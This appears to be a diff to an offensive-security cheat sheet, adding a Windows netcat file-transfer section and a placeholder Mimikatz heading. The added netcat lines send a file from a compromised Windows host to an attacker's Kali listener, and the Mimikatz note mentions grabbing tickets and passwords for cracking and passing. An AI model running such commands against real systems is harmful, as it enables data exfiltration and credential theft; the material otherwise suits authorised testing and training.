@@ -1,4 +1,4 @@
-Table of Contents
+WTable of Contents
 =================
 
    * [Table of Contents](#table-of-contents)
@@ -101,6 +101,7 @@ Table of Contents
          * [Windows download with powershell](#windows-download-with-powershell)
          * [PowerShell Priv Esc](#powershell-priv-esc)
          * [Windows Download from FTP](#windows-download-from-ftp)
+         * [ Windows NC File Transfer](#windows-nc-file-transer)
          * [Windows create SMB Server transfer files](#windows-create-smb-server-transfer-files)
          * [Windows download with VBS](#windows-download-with-vbs)
          * [Windowss XP SP1 PrivEsc](#windowss-xp-sp1-privesc)
@@ -119,6 +120,7 @@ Table of Contents
       * [AD Recon](#ad-recon)
          * [PowerView](#powerview)
          * [Bloodhound](#bloodhound)
+         *[Mimikatz Commands](#mimikatz-commands)
    * [<strong>Loot</strong>](#loot)
       * [Linux](#linux-1)
          * [Proof](#proof)
@@ -2052,6 +2054,11 @@ echo bye >> ftp.txt
 # Execute
 ftp -v -n -s:ftp.txt
 ```
+### Windows NC File Transfer
+```
+nc.exe -vn 192.168.119.131 8080 < win_rev.doc #From windows machine
+nc -lvnp 8080 > win_rev.doc   #To kali box
+```
 
 ### Windows create SMB Server transfer files
 
@@ -2313,7 +2320,12 @@ SharpHound for local Active Directory # run the collector on the machine using S
 "Invoke-BloodHound -CollectionMethod All  -Domain <DomainName> -ZipFileName <file.zip>" # copy zip over to attack machine to run in neo4j DB
 
 ```
+### Mimikatz Commands
 
+```
+Add commands to grab tickets and passwords for cracking & passing
+
+```
 
 # **Loot**
 
